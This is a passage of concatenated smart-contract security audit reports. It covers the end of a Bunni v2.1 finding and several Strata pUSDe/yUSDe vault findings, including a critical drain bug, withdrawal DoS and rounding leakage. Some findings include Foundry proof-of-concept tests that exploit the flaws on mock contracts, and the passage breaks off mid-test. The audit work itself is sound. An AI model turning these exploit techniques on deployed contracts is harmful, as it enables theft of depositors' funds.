        if (cumulativeAmount0_ == 0) return (true, tickUpper);

        ...

        // ensure that roundedTick is not tickUpper when cumulativeAmount0_ is non-zero
        // this can happen if the corresponding cumulative density is too small
--      if (roundedTick == tickUpper && cumulativeAmount0_ != 0) {
++      if (roundedTick == tickUpper) {
            return (true, tickUpper - tickSpacing);
        }
    }
```

* `LibUniformDistribution::inverseCumulativeAmount1`:

```diff
    function inverseCumulativeAmount1(
        uint256 cumulativeAmount1_,
        uint256 totalLiquidity,
        int24 tickSpacing,
        int24 tickLower,
        int24 tickUpper,
        bool isCarpet
    ) internal pure returns (bool success, int24 roundedTick) {
        // short circuit if cumulativeAmount1_ is 0
        if (cumulativeAmount1_ == 0) return (true, tickLower - tickSpacing);

        ...

        // ensure that roundedTick is not (tickLower - tickSpacing) when cumulativeAmount1_ is non-zero and rounding up
        // this can happen if the corresponding cumulative density is too small
--      if (roundedTick == tickLower - tickSpacing && cumulativeAmount1_ != 0) {
++      if (roundedTick == tickLower - tickSpacing) {
            return (true, tickLower);
        }
    }
```

**Bacon Labs:** Fixed in [PR \#117](https://github.com/timeless-fi/bunni-v2/pull/117).

**Cyfrin:** Verified, the short-circuiting logic has been improved in the carpeted LDFs and the unnecessary validation has been removed from `LibUniformDistribution and LibGeometricDistribution`.

\clearpage

------ FILE END car/reports_md/2025-06-10-cyfrin-bunni-v2.1.md ------


------ FILE START car/reports_md/2025-06-11-cyfrin-strata-predeposit-v2.1.md ------

**Lead Auditors**

[Dacian](https://x.com/DevDacian)

[Giovanni Di Siena](https://x.com/giovannidisiena)

**Assisting Auditors**



---

# Findings
## Critical Risk


### An attacker can drain the entire protocol balance of sUSDe during the yield phase due to incorrect redemption accounting logic in `pUSDeVault::_withdraw`

**Description:** After transitioning to the yield phase, the entire protocol balance of USDe is deposited into sUSDe and pUSDe can be deposited into the yUSDe vault to earn additional yield from the sUSDe. When initiating a redemption, `yUSDeVault::_withdraw` is called which in turn invokes `pUSDeVault::redeem`:

```solidity
    function _withdraw(address caller, address receiver, address owner, uint256 pUSDeAssets, uint256 shares) internal override {
        if (!withdrawalsEnabled) {
            revert WithdrawalsDisabled();
        }

        if (caller != owner) {
            _spendAllowance(owner, caller, shares);
        }


        _burn(owner, shares);
@>      pUSDeVault.redeem(pUSDeAssets, receiver, address(this));
        emit Withdraw(caller, receiver, owner, pUSDeAssets, shares);
    }
```

This is intended to have the overall effect of atomically redeeming yUSDe -> pUSDe -> sUSDe by previewing and applying any necessary yield from sUSDe:

```solidity
    function _withdraw(address caller, address receiver, address owner, uint256 assets, uint256 shares) internal override {

            if (PreDepositPhase.YieldPhase == currentPhase) {
                // sUSDeAssets = sUSDeAssets + user_yield_sUSDe
@>              assets += previewYield(caller, shares);

@>              uint sUSDeAssets = sUSDe.previewWithdraw(assets); // @audit - this rounds up because sUSDe requires the amount of sUSDe burned to receive assets amount of USDe to round up, but below we are transferring this rounded value out to the receiver which actually rounds against the protocol/yUSDe depositors!

                _withdraw(
                    address(sUSDe),
                    caller,
                    receiver,
                    owner,
                    assets, // @audit - this should not include the yield, since it is decremented from depositedBase
                    sUSDeAssets,
                    shares
                );
                return;
            }
        ...
    }
```

However, by incrementing `assets` in the case where this is a yUSDe redemption and there has been yield accrued by sUSDe, this will attempt to decrement the `depositedBase` state by more than intended:

```solidity
    function _withdraw(
            address token,
            address caller,
            address receiver,
            address owner,
            uint256 baseAssets,
            uint256 tokenAssets,
            uint256 shares
        ) internal virtual {
            if (caller != owner) {
                _spendAllowance(owner, caller, shares);
            }
@>          depositedBase -= baseAssets; // @audit - this can underflow when redeeming yUSDe because previewYield() increments assets based on sUSDe preview but this decrement should be equivalent to the base asset amount that is actually withdrawn from the vault (without yield)

            _burn(owner, shares);
            SafeERC20.safeTransfer(IERC20(token), receiver, tokenAssets);
            onAfterWithdrawalChecks();

            emit Withdraw(caller, receiver, owner, baseAssets, shares);
            emit OnMetaWithdraw(receiver, token, tokenAssets, shares);
        }
```

If the incorrect state update results in an unexpected underflow then yUSDe depositors may be unable to redeem their shares (principal + yield). However, if a faulty yUSDe redemption is processed successfully (i.e. if the relative amount of USDe underlying pUSDe is sufficiently large compared to the total supply of yUSDe and the corresponding sUSDe yield) then pUSDe depositors will erroneously and unexpectedly redeem their shares for significantly less USDe than they originally deposited. This effect will be magnified by subsequent yUSDe redemptions as the `total_yield_USDe` will be computed as larger than it is in reality due to `depositedBase` being much smaller than it should be:

```solidity
    function previewYield(address caller, uint256 shares) public view virtual returns (uint256) {
        if (PreDepositPhase.YieldPhase == currentPhase && caller == address(yUSDe)) {
            uint total_sUSDe = sUSDe.balanceOf(address(this));
            uint total_USDe = sUSDe.previewRedeem(total_sUSDe);

@>          uint total_yield_USDe = total_USDe - Math.min(total_USDe, depositedBase);
            uint y_pUSDeShares = balanceOf(caller);

            uint caller_yield_USDe = total_yield_USDe.mulDiv(shares, y_pUSDeShares, Math.Rounding.Floor);

            return caller_yield_USDe;
        }
        return 0;
    }
```

This in turn causes `depositedBase` to be further decremented until it is eventually tends to zero, impacting all functionality that relies of the overridden `totalAssets()`. Given that it is possible to inflate the sUSDe yield by either transferring USDe directly or waiting to sandwich a legitimate yield accrual (since `sUSDe::previewRedeem` does not account for the vesting schedule) this allows an attacker to completely devastate the pUSDe/yUSDe accounting, redeeming their yUSDe for close to the entire protocol sUSDe balance at the expense of all other depositors.

**Impact:** Significant loss of user funds.

**Proof of Concept:**
```solidity
pragma solidity 0.8.28;

import {Test} from "forge-std/Test.sol";
import {ERC1967Proxy} from "@openzeppelin/contracts/proxy/ERC1967/ERC1967Proxy.sol";
import {IERC4626} from "@openzeppelin/contracts/interfaces/IERC4626.sol";
import {IERC20} from "@openzeppelin/contracts/token/ERC20/ERC20.sol";

import {MockUSDe} from "../contracts/test/MockUSDe.sol";
import {MockStakedUSDe} from "../contracts/test/MockStakedUSDe.sol";
import {MockERC4626} from "../contracts/test/MockERC4626.sol";

import {pUSDeVault} from "../contracts/predeposit/pUSDeVault.sol";
import {yUSDeVault} from "../contracts/predeposit/yUSDeVault.sol";

import {console2} from "forge-std/console2.sol";

contract CritTest is Test {
    uint256 constant MIN_SHARES = 0.1 ether;

    MockUSDe public USDe;
    MockStakedUSDe public sUSDe;
    pUSDeVault public pUSDe;
    yUSDeVault public yUSDe;

    address account;

    address alice = makeAddr("alice");
    address bob = makeAddr("bob");

    function setUp() public {
        address owner = msg.sender;

        // Prepare Ethena and Ethreal contracts
        USDe = new MockUSDe();
        sUSDe = new MockStakedUSDe(USDe, owner, owner);

        // Prepare pUSDe and Depositor contracts
        pUSDe = pUSDeVault(
            address(
                new ERC1967Proxy(
                    address(new pUSDeVault()),
                    abi.encodeWithSelector(pUSDeVault.initialize.selector, owner, USDe, sUSDe)
                )
            )
        );

        yUSDe = yUSDeVault(
            address(
                new ERC1967Proxy(
                    address(new yUSDeVault()),
                    abi.encodeWithSelector(yUSDeVault.initialize.selector, owner, USDe, sUSDe, pUSDe)
                )
            )
        );

        vm.startPrank(owner);
        pUSDe.setDepositsEnabled(true);
        pUSDe.setWithdrawalsEnabled(true);
        pUSDe.updateYUSDeVault(address(yUSDe));

        // deposit USDe and burn minimum shares to avoid reverting on redemption
        uint256 initialUSDeAmount = pUSDe.previewMint(MIN_SHARES);
        USDe.mint(owner, initialUSDeAmount);
        USDe.approve(address(pUSDe), initialUSDeAmount);
        pUSDe.mint(MIN_SHARES, address(0xdead));
        vm.stopPrank();

        if (pUSDe.balanceOf(address(0xdead)) != MIN_SHARES) {
            revert("address(0xdead) should have MIN_SHARES shares of pUSDe");
        }
    }

    function test_crit() public {
        uint256 aliceDeposit = 100 ether;
        uint256 bobDeposit = 2 * aliceDeposit;

        // fund users
        USDe.mint(alice, aliceDeposit);
        USDe.mint(bob, bobDeposit);

        // alice deposits into pUSDe
        vm.startPrank(alice);
        USDe.approve(address(pUSDe), aliceDeposit);
        uint256 aliceShares_pUSDe = pUSDe.deposit(aliceDeposit, alice);
        vm.stopPrank();

        // bob deposits into pUSDe
        vm.startPrank(bob);
        USDe.approve(address(pUSDe), bobDeposit);
        uint256 bobShares_pUSDe = pUSDe.deposit(bobDeposit, bob);
        vm.stopPrank();

        // setup assertions
        assertEq(pUSDe.balanceOf(alice), aliceShares_pUSDe, "Alice should have shares equal to her deposit");
        assertEq(pUSDe.balanceOf(bob), bobShares_pUSDe, "Bob should have shares equal to his deposit");

        {
            // phase change
            account = msg.sender;
            uint256 initialAdminTransferAmount = 1e6;
            vm.startPrank(account);
            USDe.mint(account, initialAdminTransferAmount);
            USDe.approve(address(pUSDe), initialAdminTransferAmount);
            pUSDe.deposit(initialAdminTransferAmount, address(yUSDe));
            pUSDe.startYieldPhase();
            yUSDe.setDepositsEnabled(true);
            yUSDe.setWithdrawalsEnabled(true);
            vm.stopPrank();
        }

        // bob deposits into yUSDe
        vm.startPrank(bob);
        pUSDe.approve(address(yUSDe), bobShares_pUSDe);
        uint256 bobShares_yUSDe = yUSDe.deposit(bobShares_pUSDe, bob);
        vm.stopPrank();

        // simulate sUSDe yield transfer
        uint256 sUSDeYieldAmount = 100 ether;
        USDe.mint(address(sUSDe), sUSDeYieldAmount);

        {
            // bob redeems from yUSDe
            uint256 bobBalanceBefore_sUSDe = sUSDe.balanceOf(bob);
            vm.prank(bob);
            yUSDe.redeem(bobShares_yUSDe/2, bob, bob);
            uint256 bobRedeemed_sUSDe = sUSDe.balanceOf(bob) - bobBalanceBefore_sUSDe;
            uint256 bobRedeemed_USDe = sUSDe.previewRedeem(bobRedeemed_sUSDe);

            console2.log("Bob redeemed sUSDe (1): %s", bobRedeemed_sUSDe);
            console2.log("Bob} redeemed USDe (1): %s", bobRedeemed_USDe);

            // bob can redeem again
            bobBalanceBefore_sUSDe = sUSDe.balanceOf(bob);
            vm.prank(bob);
            yUSDe.redeem(bobShares_yUSDe/5, bob, bob);
            uint256 bobRedeemed_sUSDe_2 = sUSDe.balanceOf(bob) - bobBalanceBefore_sUSDe;
            uint256 bobRedeemed_USDe_2 = sUSDe.previewRedeem(bobRedeemed_sUSDe);

            console2.log("Bob redeemed sUSDe (2): %s", bobRedeemed_sUSDe_2);
            console2.log("Bob redeemed USDe (2): %s", bobRedeemed_USDe_2);

            // bob redeems once more
            bobBalanceBefore_sUSDe = sUSDe.balanceOf(bob);
            vm.prank(bob);
            yUSDe.redeem(bobShares_yUSDe/6, bob, bob);
            uint256 bobRedeemed_sUSDe_3 = sUSDe.balanceOf(bob) - bobBalanceBefore_sUSDe;
            uint256 bobRedeemed_USDe_3 = sUSDe.previewRedeem(bobRedeemed_sUSDe);

            console2.log("Bob redeemed sUSDe (3): %s", bobRedeemed_sUSDe_3);
            console2.log("Bob redeemed USDe (3): %s", bobRedeemed_USDe_3);
        }

        console2.log("pUSDe balance of sUSDe after bob's redemptions: %s", sUSDe.balanceOf(address(pUSDe)));
        console2.log("pUSDe depositedBase after bob's redemptions: %s", pUSDe.depositedBase());

        // alice redeems from pUSDe
        uint256 aliceBalanceBefore_sUSDe = sUSDe.balanceOf(alice);
        vm.prank(alice);
        uint256 aliceRedeemed_USDe_reported = pUSDe.redeem(aliceShares_pUSDe, alice, alice);
        uint256 aliceRedeemed_sUSDe = sUSDe.balanceOf(alice) - aliceBalanceBefore_sUSDe;
        uint256 aliceRedeemed_USDe = sUSDe.previewRedeem(aliceRedeemed_sUSDe);

        console2.log("Alice redeemed sUSDe: %s", aliceRedeemed_sUSDe);
        console2.log("Alice redeemed USDe: %s", aliceRedeemed_USDe);
        console2.log("Alice lost %s USDe", aliceDeposit - aliceRedeemed_USDe);

        // uncomment to observe the assertion fail
        // assertApproxEqAbs(aliceRedeemed_USDe, aliceDeposit, 10, "Alice should redeem approximately her deposit in USDe");
    }
}
```

**Recommended Mitigation:** While the assets corresponding to the accrued yield should be included when previewing the sUSDe withdrawal, only the base assets should be passed to the subsequent call to `_withdraw()`:

```diff
function _withdraw(address caller, address receiver, address owner, uint256 assets, uint256 shares) internal override {

        if (PreDepositPhase.YieldPhase == currentPhase) {
            // sUSDeAssets = sUSDeAssets + user_yield_sUSDe
--          assets += previewYield(caller, shares);
++          uint256 assetsPlusYield = assets + previewYield(caller, shares);

--          uint sUSDeAssets = sUSDe.previewWithdraw(assets);
++          uint sUSDeAssets = sUSDe.previewWithdraw(assetsPlusYield);

            _withdraw(
                address(sUSDe),
                caller,
                receiver,
                owner,
                assets
                sUSDeAssets,
                shares
            );
            return;
        }
    ...
}
```

**Strata:** Fixed in commit [903d052](https://github.com/Strata-Money/contracts/commit/903d0528eedf784a34a393bd9210adb28451b27c).

**Cyfrin:** Verified. Yield is no longer included within the decremented assets amount and the test now passes with the assertion included.

\clearpage
## High Risk


### During the yield phase, when using supported vaults, users can't withdraw vault assets they are entitled to

**Description:** During the yield phase, when using supported vaults, users can't withdraw vault assets they are entitled to.

**Proof of Concept:**
```solidity
function test_yieldPhase_supportedVaults_userCantWithdrawVaultAssets() external {
    // user1 deposits $1000 USDe into the main vault
    uint256 user1AmountInMainVault = 1000e18;
    USDe.mint(user1, user1AmountInMainVault);

    vm.startPrank(user1);
    USDe.approve(address(pUSDe), user1AmountInMainVault);
    uint256 user1MainVaultShares = pUSDe.deposit(user1AmountInMainVault, user1);
    vm.stopPrank();

    assertEq(pUSDe.totalAssets(), user1AmountInMainVault);
    assertEq(pUSDe.balanceOf(user1), user1MainVaultShares);

    // admin triggers yield phase on main vault which stakes all vault's USDe
    pUSDe.startYieldPhase();
    // totalAssets() still returns same amount as it is overridden in pUSDeVault
    assertEq(pUSDe.totalAssets(), user1AmountInMainVault);
    // balanceOf shows pUSDeVault has deposited its USDe in sUSDe
    assertEq(USDe.balanceOf(address(pUSDe)), 0);
    assertEq(USDe.balanceOf(address(sUSDe)), user1AmountInMainVault);

    // create an additional supported ERC4626 vault
    MockERC4626 newSupportedVault = new MockERC4626(USDe);
    pUSDe.addVault(address(newSupportedVault));
    // add eUSDe again since `startYieldPhase` removes it
    pUSDe.addVault(address(eUSDe));

    // verify two additional vaults now suppported
    assertTrue(pUSDe.isAssetSupported(address(eUSDe)));
    assertTrue(pUSDe.isAssetSupported(address(newSupportedVault)));

    // user2 deposits $600 into each vault
    uint256 user2AmountInEachSubVault = 600e18;
    USDe.mint(user2, user2AmountInEachSubVault*2);

    vm.startPrank(user2);
    USDe.approve(address(eUSDe), user2AmountInEachSubVault);
    uint256 user2SubVaultSharesInEach = eUSDe.deposit(user2AmountInEachSubVault, user2);
    USDe.approve(address(newSupportedVault), user2AmountInEachSubVault);
    newSupportedVault.deposit(user2AmountInEachSubVault, user2);
    vm.stopPrank();

    // verify balances correct
    assertEq(eUSDe.totalAssets(), user2AmountInEachSubVault);
    assertEq(newSupportedVault.totalAssets(), user2AmountInEachSubVault);

    // user2 deposits using their shares via MetaVault::deposit
    vm.startPrank(user2);
    eUSDe.approve(address(pUSDe), user2SubVaultSharesInEach);
    pUSDe.deposit(address(eUSDe), user2SubVaultSharesInEach, user2);
    newSupportedVault.approve(address(pUSDe), user2SubVaultSharesInEach);
    pUSDe.deposit(address(newSupportedVault), user2SubVaultSharesInEach, user2);
    vm.stopPrank();

    // verify main vault total assets includes everything
    assertEq(pUSDe.totalAssets(), user1AmountInMainVault + user2AmountInEachSubVault*2);
    // main vault not carrying any USDe balance
    assertEq(USDe.balanceOf(address(pUSDe)), 0);
    // user2 lost their subvault shares
    assertEq(eUSDe.balanceOf(user2), 0);
    assertEq(newSupportedVault.balanceOf(user2), 0);
    // main vault gained the subvault shares
    assertEq(eUSDe.balanceOf(address(pUSDe)), user2SubVaultSharesInEach);
    assertEq(newSupportedVault.balanceOf(address(pUSDe)), user2SubVaultSharesInEach);

    // verify user2 entitled to withdraw their total token amount
    assertEq(pUSDe.maxWithdraw(user2), user2AmountInEachSubVault*2);

    // try and do it, reverts due to insufficient balance
    vm.startPrank(user2);
    vm.expectRevert(); // ERC20InsufficientBalance
    pUSDe.withdraw(user2AmountInEachSubVault*2, user2, user2);

    // try 1 wei more than largest deposit from user 1, fails for same reason
    vm.expectRevert(); // ERC20InsufficientBalance
    pUSDe.withdraw(user1AmountInMainVault+1, user2, user2);

    // can withdraw up to max deposit amount $1000
    pUSDe.withdraw(user1AmountInMainVault, user2, user2);

    // user2 still has $200 left to withdraw
    assertEq(pUSDe.maxWithdraw(user2), 200e18);

    // trying to withdraw it reverts
    vm.expectRevert(); // ERC20InsufficientBalance
    pUSDe.withdraw(200e18, user2, user2);

    // can't withdraw anymore, even trying 1 wei will revert
    vm.expectRevert();
    pUSDe.withdraw(1e18, user2, user2);
}
```

**Recommended Mitigation:** In `pUSDeVault::_withdraw`, inside the yield-phase `if` condition, there should be a call to `redeemRequiredBaseAssets` if there is insufficient `USDe` balance to fulfill the withdrawal.

Alternatively another potential fix is to not allow supported vaults to be added during the yield phase (apart from `sUSDe` which is added when the yield phase is enabled).

**Strata:** Fixed in commit [076d23e](https://github.com/Strata-Money/contracts/commit/076d23e2446ad6780b2c014d66a46e54425a8769#diff-34cf784187ffa876f573d51b705940947bc06ec85f8c303c1b16a4759f59524eR190) by no longer allowing adding new supporting vaults during the yield phase.

**Cyfrin:** Verified.

\clearpage
## Medium Risk


### `MetaVault::redeemRequiredBaseAssets` should be able to redeem small amounts from each vault to fill requested amount and avoid redeeming more than requested

**Description:** `MetaVault::redeemRequiredBaseAssets` is supposed to iterate through the supported vaults, redeeming assets until the required amount of base assets is obtained:
```solidity
/// @notice Iterates through supported vaults and redeems assets until the required amount of base tokens is obtained
```

Its implementation however only retrieves from a supported vault if that one withdrawal can satisfy the desired amount:
```solidity
function redeemRequiredBaseAssets (uint baseTokens) internal {
    for (uint i = 0; i < assetsArr.length; i++) {
        IERC4626 vault = IERC4626(assetsArr[i].asset);
        uint totalBaseTokens = vault.previewRedeem(vault.balanceOf(address(this)));
        // @audit only withdraw if a single withdraw can satisfy desired amount
        if (totalBaseTokens >= baseTokens) {
            vault.withdraw(baseTokens, address(this), address(this));
            break;
        }
    }
}
```

**Impact:** This has a number of potential problems:
1) if no single withdraw can satisfy the desired amount, then the calling function will revert due to insufficient funds even if the desired amount could be satisfied by multiple smaller withdrawals from different supported vaults
2) a single withdraw may be greater than the desired amount, leaving `USDe` tokens inside the vault contract. This is suboptimal as then they would not be earning yield by being staked in `sUSDe`, and there appears to be no way for the contract owner to trigger the staking once the yield phase has started, since supporting vaults can be added and deposits for them work during the yield phase

**Recommended Mitigation:** `MetaVault::redeemRequiredBaseAssets` should:
* keep track of the total currently redeemed amount
* calculate the remaining requested amount as the requested amount minus the total currently redeemed amount
* if the current vault is not able to redeem the remaining requested amount, redeem as much as possible and increase the total currently redeemed amount by the amount redeemed
* if the current vault could redeem more than the remaining requested amount, redeem only enough to satisfy the remaining requested amount

The above strategy ensures that:
* small amounts from multiple vaults can be used to fulfill the requested amount
* greater amounts than requested are not withdrawn, so no `USDe` tokens remain inside the vault unable to be staked and not earning yield

**Strata:** Fixed in commits [4efba0c](https://github.com/Strata-Money/contracts/commit/4efba0c484a3bd6d4934e0f1ec0eb91848c94298), [7e6e859](https://github.com/Strata-Money/contracts/commit/7e6e8594c05ea7e3837ddbe7395b4a15ea34c7e9).

**Cyfrin:** Verified.


### DoS of meta vault withdrawals during points phase if one vault is paused or attempted redemption exceeds the maximum

**Description:** `pUSDeVault::_withdraw` assumes any `USDe` shortfall is covered by the multi-vaults; however, `redeemRequiredBaseAssets()` does not guarantee that the required assets are available or actually withdrawn, so the subsequent ERC-20 token transfer could fail and DoS withdrawals if the ERC-4626 withdrawal does not already revert. Usage of `ERC4626Upgradeable::previewRedeem` in `redeemRequiredBaseAssets()` is problematic as this could attempt to withdraw more assets than the vault will allow. Per the [ERC-4626 specification](https://eips.ethereum.org/EIPS/eip-4626), `previewRedeem()`:
> * MUST NOT account for redemption limits like those returned from maxRedeem and should always act as though the redemption would be accepted, regardless if the user has enough shares, etc.
> * MUST NOT revert due to vault specific user/global limits. MAY revert due to other conditions that would also cause redeem to revert.

So an availability-aware check such as `maxWithdraw()` which considers pause states and any other limits should be used instead to prevent one vault reverting when it may be possible to process the withdrawal by redeeming from another.

**Impact:** If one of the supported meta vaults is paused or experiences a hack of the underlying `USDe` which results in a decrease in share price during the points phase then this will prevent withdrawals from being processed even if it is possible to do so by redeeming from another.

**Proof of Concept:** First modify the `MockERC4626` to simulate a vault that pauses deposits/withdrawals and could return fewer assets when querying `maxWithdraw()` when compared with `previewRedeem()`:

```solidity
contract MockERC4626 is ERC4626 {
    bool public depositsEnabled;
    bool public withdrawalsEnabled;
    bool public hacked;

    error DepositsDisabled();
    error WithdrawalsDisabled();

    event DepositsEnabled(bool enabled);
    event WithdrawalsEnabled(bool enabled);

    constructor(IERC20 token) ERC20("MockERC4626", "M4626") ERC4626(token)  {}

    function _deposit(address caller, address receiver, uint256 assets, uint256 shares) internal override {
        if (!depositsEnabled) {
            revert DepositsDisabled();
        }

        super._deposit(caller, receiver, assets, shares);
    }

    function _withdraw(address caller, address receiver, address owner, uint256 assets, uint256 shares)
        internal
        override
    {
        if (!withdrawalsEnabled) {
            revert WithdrawalsDisabled();
        }

        super._withdraw(caller, receiver, owner, assets, shares);
    }

    function maxWithdraw(address owner) public view override returns (uint256) {
        if (!withdrawalsEnabled) {
            revert WithdrawalsDisabled();
        }

        if (hacked) {
            return super.maxWithdraw(owner) / 2; // Reduce max withdraw by half to simulate some limit
        }
        return super.maxWithdraw(owner);
    }

    function totalAssets() public view override returns (uint256) {
        if (hacked) {
            return super.totalAssets() * 3/4; // Reduce total assets by 25% to simulate some loss
        }
        return super.totalAssets();
    }

    function setDepositsEnabled(bool depositsEnabled_) external {
        depositsEnabled = depositsEnabled_;
        emit DepositsEnabled(depositsEnabled_);
    }

    function setWithdrawalsEnabled(bool withdrawalsEnabled_) external {
        withdrawalsEnabled = withdrawalsEnabled_;
        emit WithdrawalsEnabled(withdrawalsEnabled_);
    }

    function hack() external {
        hacked = true;
    }
}
```

The following test can then be run in `pUSDeVault.t.sol`:
```solidity
error WithdrawalsDisabled();
error ERC4626ExceededMaxWithdraw(address owner, uint256 assets, uint256 max);
error ERC20InsufficientBalance(address from, uint256 balance, uint256 amount);

function test_redeemRequiredBaseAssetsDoS() public {
    assert(address(USDe) != address(0));

    account = msg.sender;

    // deposit USDe
    USDe.mint(account, 10 ether);
    deposit(USDe, 10 ether);
    assertBalance(pUSDe, account, 10 ether, "Initial deposit");

    // deposit eUSDe
    USDe.mint(account, 10 ether);
    USDe.approve(address(eUSDe), 10 ether);
    eUSDe.setDepositsEnabled(true);
    eUSDe.deposit(10 ether, account);
    assertBalance(eUSDe, account, 10 ether, "Deposit to eUSDe");
    eUSDe.approve(address(pUSDeDepositor), 10 ether);
    pUSDeDepositor.deposit(eUSDe, 10 ether, account);

    // simulate trying to withdraw from the eUSDe vault when it is paused
    uint256 withdrawAmount = 20 ether;
    eUSDe.setWithdrawalsEnabled(false);
    vm.expectRevert(abi.encodeWithSelector(WithdrawalsDisabled.selector));
    pUSDe.withdraw(address(USDe), withdrawAmount, account, account);
    eUSDe.setWithdrawalsEnabled(true);


    // deposit USDe from another account
    account = address(0x1234);
    vm.startPrank(account);
    USDe.mint(account, 10 ether);
    USDe.approve(address(eUSDe), 10 ether);
    eUSDe.deposit(10 ether, account);
    assertBalance(eUSDe, account, 10 ether, "Deposit to eUSDe");
    eUSDe.approve(address(pUSDeDepositor), 10 ether);
    pUSDeDepositor.deposit(eUSDe, 10 ether, account);
    vm.stopPrank();
    account = msg.sender;
    vm.startPrank(account);

    // deposit eUSDe2
    USDe.mint(account, 5 ether);
    USDe.approve(address(eUSDe2), 5 ether);
    eUSDe2.setDepositsEnabled(true);
    eUSDe2.deposit(5 ether, account);
    assertBalance(eUSDe2, account, 5 ether, "Deposit to eUSDe2");
    eUSDe2.approve(address(pUSDeDepositor), 5 ether);
    pUSDeDepositor.deposit(eUSDe2, 5 ether, account);


    // simulate when previewRedeem() in redeemRequiredBaseAssets() returns more than maxWithdraw() during withdrawal
    // as a result of a hack and imposition of a limit
    eUSDe.hack();
    uint256 maxWithdraw = eUSDe.maxWithdraw(address(pUSDe));
    vm.expectRevert(abi.encodeWithSelector(ERC4626ExceededMaxWithdraw.selector, address(pUSDe), withdrawAmount/2, maxWithdraw));
    pUSDe.withdraw(address(USDe), withdrawAmount, account, account);

    // attempt to withdraw from eUSDe2 vault, but redeemRequiredBaseAssets() skips withdrawal attempt
    // so there are insufficient assets to cover the subsequent transfer even though there is enough in the vaults
    eUSDe2.setWithdrawalsEnabled(true);
    vm.expectRevert(abi.encodeWithSelector(ERC20InsufficientBalance.selector, address(pUSDe), eUSDe2.balanceOf(address(pUSDe)), withdrawAmount));
    pUSDe.withdraw(address(eUSDe2), withdrawAmount, account, account);
}
```

**Recommended Mitigation:**
```diff
    function redeemRequiredBaseAssets (uint baseTokens) internal {
        for (uint i = 0; i < assetsArr.length; i++) {
            IERC4626 vault = IERC4626(assetsArr[i].asset);
--          uint totalBaseTokens = vault.previewRedeem(vault.balanceOf(address(this)));
++          uint256 totalBaseTokens = vault.maxWithdraw(address(this));
            if (totalBaseTokens >= baseTokens) {
                vault.withdraw(baseTokens, address(this), address(this));
                break;
            }
        }
    }
```

**Strata:** Fixed in commit [4efba0c](https://github.com/Strata-Money/contracts/commit/4efba0c484a3bd6d4934e0f1ec0eb91848c94298).

**Cyfrin:** Verified.


### Value leakage due to pUSDe redemptions rounding against the protocol/yUSDe depositors

**Description:** After transitioning to the yield phase, redemptions of both pUSDe and yUSDe are processed by `pUSDeVault::_withdraw` such that they are both paid out in sUSDe. This is achieved by computing the sUSDe balance corresponding to the required USDe amount by calling its `previewWithdraw()` function:

```solidity
    function _withdraw(address caller, address receiver, address owner, uint256 assets, uint256 shares) internal override {

            if (PreDepositPhase.YieldPhase == currentPhase) {
                // sUSDeAssets = sUSDeAssets + user_yield_sUSDe
@>              assets += previewYield(caller, shares);

@>              uint sUSDeAssets = sUSDe.previewWithdraw(assets); // @audit - this rounds up because sUSDe requires the amount of sUSDe burned to receive assets amount of USDe to round up, but below we are transferring this rounded value out to the receiver which actually rounds against the protocol/yUSDe depositors!

                _withdraw(
                    address(sUSDe),
                    caller,
                    receiver,
                    owner,
                    assets, // @audit - this should not include the yield, since it is decremented from depositedBase
                    sUSDeAssets,
                    shares
                );
                return;
            }
        ...
    }
```

The issue with this is that `previewWithdraw()` returns the required sUSDe balance that must be burned to receive the specified USDe amount and so rounds up accordingly; however, here this rounded sUSDe amount is being transferred out of the protocol. This means that the redemption actually rounds in favour of the receiver and against the protocol/yUSDe depositors.

**Impact:** Value can leak from the system in favour of pUSDe redemptions at the expense of other yUSDe depositors.

**Proof of Concept:** Note that the following test will revert due to underflow when attempting to determine the fully redeemed amounts unless the mitigation from C-01 is applied:

```solidity
pragma solidity 0.8.28;

import {Test} from "forge-std/Test.sol";
import {ERC1967Proxy} from "@openzeppelin/contracts/proxy/ERC1967/ERC1967Proxy.sol";
import {IERC4626} from "@openzeppelin/contracts/interfaces/IERC4626.sol";
import {IERC20} from "@openzeppelin/contracts/token/ERC20/ERC20.sol";

import {MockUSDe} from "../contracts/test/MockUSDe.sol";
import {MockStakedUSDe} from "../contracts/test/MockStakedUSDe.sol";
import {MockERC4626} from "../contracts/test/MockERC4626.sol";

import {pUSDeVault} from "../contracts/predeposit/pUSDeVault.sol";
import {yUSDeVault} from "../contracts/predeposit/yUSDeVault.sol";

import {console2} from "forge-std/console2.sol";

contract RoundingTest is Test {
    uint256 constant MIN_SHARES = 0.1 ether;

    MockUSDe public USDe;
    MockStakedUSDe public sUSDe;
    pUSDeVault public pUSDe;
    yUSDeVault public yUSDe;

    address account;

    address alice = makeAddr("alice");
    address bob = makeAddr("bob");

    function setUp() public {
        address owner = msg.sender;

        USDe = new MockUSDe();
        sUSDe = new MockStakedUSDe(USDe, owner, owner);

        pUSDe = pUSDeVault(
            address(
                new ERC1967Proxy(
                    address(new pUSDeVault()),
                    abi.encodeWithSelector(pUSDeVault.initialize.selector, owner, USDe, sUSDe)
                )
            )
        );

        yUSDe = yUSDeVault(
            address(
                new ERC1967Proxy(
                    address(new yUSDeVault()),
                    abi.encodeWithSelector(yUSDeVault.initialize.selector, owner, USDe, sUSDe, pUSDe)
                )
            )
        );

        vm.startPrank(owner);
        pUSDe.setDepositsEnabled(true);
        pUSDe.setWithdrawalsEnabled(true);
        pUSDe.updateYUSDeVault(address(yUSDe));

        // deposit USDe and burn minimum shares to avoid reverting on redemption
        uint256 initialUSDeAmount = pUSDe.previewMint(MIN_SHARES);
        USDe.mint(owner, initialUSDeAmount);
        USDe.approve(address(pUSDe), initialUSDeAmount);
        pUSDe.mint(MIN_SHARES, address(0xdead));
        vm.stopPrank();

        if (pUSDe.balanceOf(address(0xdead)) != MIN_SHARES) {
            revert("address(0xdead) should have MIN_SHARES shares of pUSDe");
        }
    }

    function test_rounding() public {
        uint256 userDeposit = 100 ether;

        // fund users
        USDe.mint(alice, userDeposit);
        USDe.mint(bob, userDeposit);

        // alice deposits into pUSDe
        vm.startPrank(alice);
        USDe.approve(address(pUSDe), userDeposit);
        uint256 aliceShares_pUSDe = pUSDe.deposit(userDeposit, alice);
        vm.stopPrank();

        // bob deposits into pUSDe
        vm.startPrank(bob);
        USDe.approve(address(pUSDe), userDeposit);
        uint256 bobShares_pUSDe = pUSDe.deposit(userDeposit, bob);
        vm.stopPrank();

        // setup assertions
        assertEq(pUSDe.balanceOf(alice), aliceShares_pUSDe, "Alice should have shares equal to her deposit");
        assertEq(pUSDe.balanceOf(bob), bobShares_pUSDe, "Bob should have shares equal to his deposit");

        {
            // phase change
            account = msg.sender;
            uint256 initialAdminTransferAmount = 1e6;
